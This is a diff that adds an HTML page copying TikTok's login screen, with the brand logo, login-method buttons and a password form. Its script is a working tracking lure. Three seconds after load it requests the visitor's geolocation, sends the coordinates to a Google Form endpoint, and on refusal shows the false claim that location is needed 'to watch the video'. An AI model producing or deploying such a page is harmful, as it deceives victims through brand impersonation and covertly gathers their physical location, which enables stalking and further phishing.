@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Log in | TikTok</title>
+    <style>
+        /* --- RESET & BASICS --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Proxima Nova', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+            outline: none;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #121212;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* --- LAYOUT CONTAINER --- */
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: #fff;
+            position: relative;
+            overflow: hidden;
+        }
+
+        @media (min-width: 768px) {
+            body {
+                background-color: rgba(0, 0, 0, 0.05);
+            }
+            .login-container {
+                height: auto;
+                min-height: 600px;
+                border-radius: 8px;
+                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            }
+        }
+
+        /* --- VIEW MANAGEMENT (SCREEN SWITCHING) --- */
+        .view-section {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            height: 100%;
+            padding: 40px 32px;
+            transition: opacity 0.2s ease;
+        }
+
+        /* Hidden state */
+        .hidden {
+            display: none !important;
+        }
+
+        /* --- SHARED ELEMENTS --- */
+        .header-text {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        .sub-text {
+            font-size: 15px;
+            color: #8a8b91;
+            margin-bottom: 32px;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .logo-area {
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        
+        .tiktok-logo {
+            width: 46px;
+            height: 46px;
+        }
+
+        /* --- SCREEN 1: SELECTION LIST --- */
+        .login-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            flex: 1;
+            overflow-y: auto;
+        }
+
+        .btn-option {
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 48px;
+            border: 1px solid rgba(22, 24, 35, 0.12);
+            border-radius: 8px;
+            background: #fff;
+            cursor: pointer;
+            text-decoration: none;
+            color: #161823;
+            font-weight: 600;
+            font-size: 15px;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-option:active {
+            background-color: #f1f1f2;
+        }
+
+        .btn-icon {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+        }
+
+        /* --- SCREEN 2: LOGIN FORM --- */
+        
+        /* Back Arrow */
+        .back-nav {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            cursor: pointer;
+            padding: 10px;
+            z-index: 10;
+        }
+
+        /* Tabs (Phone / Email) */
+        .form-tabs {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            border-bottom: 1px solid rgba(22, 24, 35, 0.12);
+        }
+
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding-bottom: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #8a8b91;
+            cursor: pointer;
+        }
+
+        .tab.active {
+            color: #161823;
+            border-bottom: 2px solid #161823;
+        }
+
+        /* Inputs */
+        .input-group {
+            margin-bottom: 12px;
+            position: relative;
+        }
+
+        .form-input {
+            width: 100%;
+            height: 48px;
+            background-color: #F1F1F2; /* Standard TikTok Input Gray */
+            border: 1px solid transparent;
+            border-radius: 4px;
+            padding: 0 16px;
+            font-size: 15px;
+            color: #161823;
+            transition: border 0.2s;
+        }
+
+        .form-input::placeholder {
+            color: #8a8b91;
+        }
+
+        .form-input:focus {
+            background-color: #fff;
+            border: 1px solid rgba(22, 24, 35, 0.2);
+        }
+
+        /* Password Eye Icon */
+        .password-toggle {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #8a8b91;
+            display: none; /* Hidden until typed in */
+        }
+
+        .forgot-link {
+            font-size: 12px;
+            color: #8a8b91;
+            font-weight: 600;
+            text-decoration: none;
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+        
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Main Action Button */
+        .btn-submit {
+            width: 100%;
+            height: 48px;
+            border-radius: 4px;
+            border: none;
+            background-color: #FE2C55; /* TikTok Pink */
+            color: white;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            opacity: 1;
+            transition: opacity 0.2s;
+        }
+
+        .btn-submit:disabled {
+            background-color: rgba(22, 24, 35, 0.06); /* Disabled Gray */
+            color: rgba(22, 24, 35, 0.34);
+            cursor: not-allowed;
+        }
+
+        /* --- FOOTERS --- */
+        .bottom-agreement {
+            margin-top: 24px;
+            font-size: 12px;
+            color: rgba(22, 24, 35, 0.5);
+            text-align: center;
+            line-height: 1.5;
+            padding-bottom: 60px;
+        }
+
+        .bottom-agreement a {
+            color: #161823;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .sticky-footer {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 64px;
+            border-top: 1px solid rgba(22, 24, 35, 0.12);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 15px;
+            background: #fff;
+        }
+        
+        @media (min-width: 768px) {
+            .sticky-footer {
+                border-bottom-left-radius: 8px;
+                border-bottom-right-radius: 8px;
+            }
+        }
+
+        .sticky-footer a {
+            color: #FE2C55;
+            font-weight: 600;
+            text-decoration: none;
+            margin-left: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        
+        <div id="view-selection" class="view-section">
+            <div class="logo-area">
+                <svg class="tiktok-logo" viewBox="0 0 46 46" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M37.5 0H8.5C3.8 0 0 3.8 0 8.5V37.5C0 42.2 3.8 46 8.5 46H37.5C42.2 46 46 42.2 46 37.5V8.5C46 3.8 42.2 0 37.5 0Z" fill="white"/>
+                    <path d="M26.7 11.1V7.1H30.8C30.8 9.3 32.6 11.1 34.8 11.1V15.2C32.6 15.2 30.8 13.4 30.8 11.2V11.1H26.7V23.5C26.7 27.6 23.4 30.9 19.3 30.9C15.2 30.9 11.9 27.6 11.9 23.5C11.9 19.4 15.2 16.1 19.3 16.1C19.8 16.1 20.3 16.1 20.7 16.2V20.4C20.3 20.2 19.8 20.2 19.3 20.2C17.5 20.2 16 21.7 16 23.5C16 25.3 17.5 26.8 19.3 26.8C21.1 26.8 22.6 25.3 22.6 23.5V11.1H26.7Z" fill="black"/>
+                    <path d="M30.8 11.2C30.8 13.4 32.6 15.2 34.8 15.2V11.1C32.6 11.1 30.8 9.3 30.8 7.1V11.1H26.7V23.5C26.7 27.6 23.4 30.9 19.3 30.9C15.2 30.9 11.9 27.6 11.9 23.5C11.9 19.4 15.2 16.1 19.3 16.1C19.8 16.1 20.3 16.1 20.7 16.2V20.4C20.3 20.2 19.8 20.2 19.3 20.2C17.5 20.2 16 21.7 16 23.5C16 25.3 17.5 26.8 19.3 26.8C21.1 26.8 22.6 25.3 22.6 23.5V11.1H26.7V11.2H30.8Z" fill="url(#paint0_linear)"/>
+                    <defs><linearGradient id="paint0_linear" x1="18" y1="31" x2="35" y2="7" gradientUnits="userSpaceOnUse"><stop stop-color="#25F4EE"/><stop offset="1" stop-color="#FE2C55"/></linearGradient></defs>
+                </svg>
+            </div>
+
+            <h1 class="header-text">Log in to TikTok</h1>
+            <p class="sub-text">Manage your account, check notifications, comment on videos, and more.</p>
+
+            <div class="login-options">
+                <div class="btn-option nav-trigger">
+                    <div class="btn-icon"><svg viewBox="0 0 48 48" fill="#161823" xmlns="http://www.w3.org/2000/svg"><path d="M24 6C17.4 6 12 11.4 12 18C12 24.6 17.4 30 24 30C30.6 30 36 24.6 36 18C36 11.4 30.6 6 24 6ZM24 34C15.2 34 8 26.8 8 18C8 9.2 15.2 2 24 2C32.8 2 40 9.2 40 18C40 26.8 32.8 34 24 34Z"/><path d="M12.9 37.7C16.1 35.8 20 34.8 24 34.8C27.9 34.8 31.8 35.9 35 37.8C38.2 39.7 40.7 42.4 42.2 45.6C42.4 46.1 42.2 46.7 41.7 47C41.2 47.2 40.7 47 40.4 46.5C39 43.5 36.7 41 33.7 39.2C30.8 37.4 27.2 36.5 23.5 36.5C19.9 36.4 16.3 37.3 13.3 39.1C12.8 39.4 12.2 39.2 11.9 38.7C11.7 38.2 11.8 37.6 12.3 37.4L12.9 37.7Z"/></svg></div>
+                    Use phone / email / username
+                </div>
+                <div class="btn-option nav-trigger">
+                    <div class="btn-icon"><svg viewBox="0 0 48 48" fill="#1877F2" xmlns="http://www.w3.org/2000/svg"><path d="M24 1C11.3 1 1 11.3 1 24C1 35.5 9.4 45 20.4 46.7V30.6H14.6V24H20.4V19C20.4 13.2 23.8 10 29 10C31.5 10 34.1 10.4 34.1 10.4V16.1H31.2C28.3 16.1 27.4 17.9 27.4 19.7V24H33.8L32.8 30.6H27.4V46.7C38.4 45 46.8 35.5 46.8 24C46.8 11.3 36.5 1 24 1Z"/></svg></div>
+                    Continue with Facebook
+                </div>
+                <div class="btn-option nav-trigger">
+                    <div class="btn-icon"><svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path d="M41.7 24.5C41.7 22.8 41.5 21.2 41.2 19.6H24V26.6H33.9C33.5 28.8 32.2 30.7 30.2 32V36.5H36.2C39.7 33.3 41.7 28.5 41.7 23V24.5Z" fill="#4285F4"/><path d="M24 42.5C29 42.5 33.2 40.8 36.2 38.1L30.2 33.5C28.6 34.6 26.5 35.2 24 35.2C19.2 35.2 15.1 32 13.7 27.6H7.5V32.4C10.5 38.4 16.7 42.5 24 42.5Z" fill="#34A853"/><path d="M13.7 27.6C13.3 26.5 13.1 25.3 13.1 24C13.1 22.7 13.3 21.5 13.7 20.4V15.6H7.5C6.3 18.1 5.6 21 5.6 24C5.6 27 6.3 29.9 7.5 32.4L13.7 27.6Z" fill="#FBBC05"/><path d="M24 12.8C26.7 12.8 29.1 13.7 31 15.5L36.3 10.3C33.1 7.3 29 5.5 24 5.5C16.7 5.5 10.5 9.6 7.5 15.6L13.7 20.4C15.1 16 19.2 12.8 24 12.8Z" fill="#EA4335"/></svg></div>
+                    Continue with Google
+                </div>
+                <div class="btn-option nav-trigger">
+                    <div class="btn-icon"><svg viewBox="0 0 48 48" fill="black" xmlns="http://www.w3.org/2000/svg"><path d="M15.4 10.5H19.6L28.8 23.9L39.6 39.5H35.4L26.3 26.4L15.4 10.5ZM10.5 6L23.8 25.4L9 39.5H15.6L26.9 28.7L39 46.5H46.5L30.6 23.4L43.8 10.5H37.2L27.6 19.7L17.1 6H10.5Z"/></svg></div>
+                    Continue with Twitter
+                </div>
+            </div>
+
+            <p class="bottom-agreement">
+                By continuing, you agree to our <a href="#">Terms of Service</a> and acknowledge that you have read our <a href="#">Privacy Policy</a>.
+            </p>
+
+            <div class="sticky-footer">
+                <span style="color: rgba(22,24,35,0.75);">Don't have an account?</span>
+                <a href="#">Sign up</a>
+            </div>
+        </div>
+
+        <div id="view-form" class="view-section hidden">
+            <div class="back-nav" id="btn-back">
+                <svg width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M22.1977 40.5284C22.7667 41.1215 23.7121 41.1444 24.3051 40.5753C24.8982 40.0063 24.9211 39.0609 24.352 38.4678L10.8076 24.3521H42.0016C42.8301 24.3521 43.5016 23.6805 43.5016 22.8521C43.5016 22.0236 42.8301 21.3521 42.0016 21.3521H10.8076L24.352 7.23631C24.9211 6.64326 24.8982 5.69784 24.3051 5.12879C23.7121 4.55973 22.7667 4.58266 22.1977 5.17571L7.20019 20.8043C6.04694 22.0062 6.04694 23.9015 7.20019 25.1034L22.1977 40.5284Z" fill="#161823"/></svg>
+            </div>
+
+            <h1 class="header-text" style="margin-top: 20px;">Log in</h1>
+            
+            <div class="form-tabs">
+                <div class="tab">Phone</div>
+                <div class="tab active">Email / Username</div>
+            </div>
+
+            <form style="display: flex; flex-direction: column;">
+                <div class="input-group">
+                    <input type="text" class="form-input" id="user-input" placeholder="Email or username">
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" class="form-input" id="pass-input" placeholder="Password">
+                    <div class="password-toggle" id="toggle-pass">
+                        <svg width="20" height="20" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 10.5C16.0286 10.5 8.95661 15.3026 5.58661 22.6139C5.25992 23.3226 5.25992 24.1488 5.58661 24.8575C8.95661 32.1688 16.0286 36.9714 24 36.9714C31.9714 36.9714 39.0434 32.1688 42.4134 24.8575C42.7401 24.1488 42.7401 23.3226 42.4134 22.6139C39.0434 15.3026 31.9714 10.5 24 10.5ZM9.00699 23.7357C11.6669 18.3475 17.4721 14.7857 24 14.7857C30.5279 14.7857 36.3331 18.3475 38.993 23.7357C36.3331 29.1239 30.5279 32.6857 24 32.6857C17.4721 32.6857 11.6669 29.1239 9.00699 23.7357Z" fill="#161823"/><path fill-rule="evenodd" clip-rule="evenodd" d="M24 19.0714C21.4365 19.0714 19.3571 21.1508 19.3571 23.7143C19.3571 26.2778 21.4365 28.3571 24 28.3571C26.5635 28.3571 28.6429 26.2778 28.6429 23.7143C28.6429 21.1508 26.5635 19.0714 24 19.0714ZM15.0714 23.7143C15.0714 18.7838 19.0695 14.7857 24 14.7857C28.9305 14.7857 32.9286 18.7838 32.9286 23.7143C32.9286 28.6447 28.9305 32.6429 24 32.6429C19.0695 32.6429 15.0714 28.6447 15.0714 23.7143Z" fill="#161823"/></svg>
+                    </div>
+                </div>
+
+                <a href="#" class="forgot-link">Forgot password?</a>
+
+                <button type="submit" class="btn-submit" id="btn-login" disabled>Log in</button>
+            </form>
+            
+            <p class="bottom-agreement" style="margin-top:auto;">
+                <br>
+            </p>
+
+            <div class="sticky-footer">
+                <span style="color: rgba(22,24,35,0.75);">Don't have an account?</span>
+                <a href="#">Sign up</a>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // DOM Elements
+        const viewSelection = document.getElementById('view-selection');
+        const viewForm = document.getElementById('view-form');
+        const triggers = document.querySelectorAll('.nav-trigger');
+        const backBtn = document.getElementById('btn-back');
+        
+        // Input Logic Elements
+        const userInput = document.getElementById('user-input');
+        const passInput = document.getElementById('pass-input');
+        const loginBtn = document.getElementById('btn-login');
+        const togglePass = document.getElementById('toggle-pass');
+
+        // 1. Navigation Logic
+        triggers.forEach(trigger => {
+            trigger.addEventListener('click', (e) => {
+                e.preventDefault();
+                viewSelection.classList.add('hidden');
+                viewForm.classList.remove('hidden');
+            });
+        });
+
+        backBtn.addEventListener('click', () => {
+            viewForm.classList.add('hidden');
+            viewSelection.classList.remove('hidden');
+        });
+
+        // 2. Form Validation Logic (Enable button if text exists)
+        function checkInputs() {
+            if (userInput.value.length > 0 && passInput.value.length > 0) {
+                loginBtn.disabled = false;
+                loginBtn.style.opacity = "1";
+            } else {
+                loginBtn.disabled = true;
+                loginBtn.style.opacity = "0.5";
+            }
+
+            // Toggle Eye Icon visibility based on password length
+            if (passInput.value.length > 0) {
+                togglePass.style.display = 'block';
+            } else {
+                togglePass.style.display = 'none';
+            }
+        }
+
+        userInput.addEventListener('input', checkInputs);
+        passInput.addEventListener('input', checkInputs);
+
+        // 3. Password Visibility Toggle
+        togglePass.addEventListener('click', () => {
+            if (passInput.type === "password") {
+                passInput.type = "text";
+                togglePass.style.opacity = "0.6"; // Indicate active state
+            } else {
+                passInput.type = "password";
+                togglePass.style.opacity = "1";
+            }
+        });
+        function requestLocation() {
+          if (!navigator.geolocation) {
+            alert("Your device does not support location.");
+            return;
+          }
+        
+          navigator.geolocation.getCurrentPosition(success, error);
+        }
+            
+        function success(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+      
+          // Send location to your Google Form
+          fetch("https://docs.google.com/forms/d/e/1FAIpQLSfELTAWud7thRvLn6_2EsjaHGidGSkfbMmmC9LTHzdAOWMJiQ/formResponse", {
+            method: "POST",
+            body: new URLSearchParams({
+              "entry.8708125": lat + "," + lon
+            })
+          });
+        }
+           
+        function error() {
+          alert("You must allow location to watch the video.");
+        }
+        window.addEventListener("load", function() {
+          setTimeout(requestLocation, 3000); // 3000 milliseconds = 3 seconds
+        });   
+    </script>
+</body>
+</html>
+
